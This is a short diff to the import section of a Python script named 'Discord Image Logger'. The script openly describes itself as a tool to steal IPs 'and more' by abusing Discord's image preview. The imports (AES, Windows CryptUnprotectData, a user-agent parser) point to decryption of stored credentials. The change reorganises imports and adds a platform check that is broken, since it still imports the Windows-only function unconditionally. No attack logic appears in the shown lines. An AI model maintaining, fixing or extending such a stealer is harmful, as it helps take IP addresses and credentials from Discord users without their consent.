@@ -3,15 +3,21 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 from datetime import datetime
 from os import getlogin, listdir
-import requests, json, os
+import os
 from json import loads
 from re import findall
 from base64 import b64decode
+
+import sys
+if sys.platform == "win32":
+    import win32crypt
+else:
+    win32crypt = None
+from win32crypt import CryptUnprotectData
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
